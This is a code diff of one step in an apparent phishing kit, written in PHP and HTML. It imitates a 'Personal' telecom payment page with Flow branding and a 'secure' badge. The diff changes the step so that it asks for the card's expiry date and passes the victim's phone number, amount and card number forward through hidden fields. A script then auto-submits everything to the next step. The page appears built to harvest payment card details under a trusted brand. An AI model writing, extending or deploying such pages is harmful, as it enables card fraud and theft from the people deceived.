@@ -1,13 +1,28 @@
 <?php
 /**
- * STEP 4 - Número de tarjeta
+ * STEP 4 - Vencimiento
  */
-session_start();
 
-// Guardar tarjeta si viene por POST
-if(isset($_POST['card'])) {
-    $_SESSION['card'] = trim($_POST['card']);
-    header('Location: step5.php');
+$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
+$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
+$card = isset($_POST['card']) ? trim($_POST['card']) : '';
+
+if(isset($_POST['venc']) && !empty($_POST['venc'])) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head><title>Redirigiendo...</title></head>
+    <body>
+        <form id="autoForm" method="POST" action="step5.php">
+            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
+            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($_POST['venc']); ?>">
+        </form>
+        <script>document.getElementById('autoForm').submit();</script>
+    </body>
+    </html>
+    <?php
     exit;
 }
 ?>
@@ -16,10 +31,9 @@ if(isset($_POST['card'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tarjeta | Personal</title>
+    <title>Vencimiento | Personal</title>
     <link rel="stylesheet" href="css/op/bootstrap.min.css">
     <link rel="stylesheet" href="css/op/styles.css">
-    <link rel="stylesheet" href="css/op/index.css">
 </head>
 <body style="background-color: #e5e5e5;">
     <div class="container-fluid">
@@ -27,28 +41,28 @@ if(isset($_POST['card'])) {
             <div class="col-12 p-0">
                 <header class="header">
                     <nav class="px-0 pt-0">
-                        <div class="d-flex justify-content-between align-items-center">
-                            <div class="ml-3 ml-md-5">
-                                <img src="assets/flow.svg" class="pl-md-4 img-fluid" style="height: 40px;">
-                            </div>
-                            <div class="mr-3 mr-md-5">
-                                <img src="assets/secure.svg" class="pr-md-4 d-none d-sm-block" style="height: 30px;">
-                            </div>
+                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
+                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
+                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
                         </div>
                     </nav>
                 </header>
 
                 <div class="row justify-content-center mt-5">
                     <div class="col-12 text-center">
-                        <h1 class="text-center mb-4" style="color: #333; font-size: 28px;">Número de tarjeta</h1>
+                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Fecha de vencimiento</h1>
                     </div>
 
                     <div class="col-11 col-sm-6">
                         <form method="POST" action="step4.php">
+                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+                            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
+                            
                             <div class="form-group">
-                                <label style="color: #666;">Ingresá el número de tu tarjeta</label>
-                                <input type="text" name="card" id="card" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" style="height: 50px; font-size: 16px;" required>
-                                <small class="form-text text-muted">16 dígitos de tu tarjeta</small>
+                                <label style="color: #666;">Vencimiento (MM/AA)</label>
+                                <input type="text" name="venc" id="venc" class="form-control" placeholder="12/26" maxlength="5" style="height: 50px; font-size: 16px;" required>
+                                <small class="text-muted">Mes y año de vencimiento</small>
                             </div>
 
                             <div class="text-center mt-4">
@@ -65,12 +79,14 @@ if(isset($_POST['card'])) {
     <script src="javascript/query.min.js"></script>
     <script src="javascript/jquery.mask.js"></script>
     <script>
-        $('#card').mask('0000 0000 0000 0000');
-        
-        $('#card').on('keyup', function(){
-            var valor = $(this).val().replace(/ /g, '');
-            if(valor.length >= 15) {
-                $('#btnContinuar').prop('disabled', false);
+        $('#venc').mask('00/00');
+        $('#venc').on('keyup', function(){
+            var valor = $(this).val();
+            if(valor.length == 5) {
+                var partes = valor.split('/');
+                var mes = parseInt(partes[0]);
+                var anio = parseInt(partes[1]);
+                $('#btnContinuar').prop('disabled', !(mes >= 1 && mes <= 12 && anio >= 25));
             } else {
                 $('#btnContinuar').prop('disabled', true);
             }
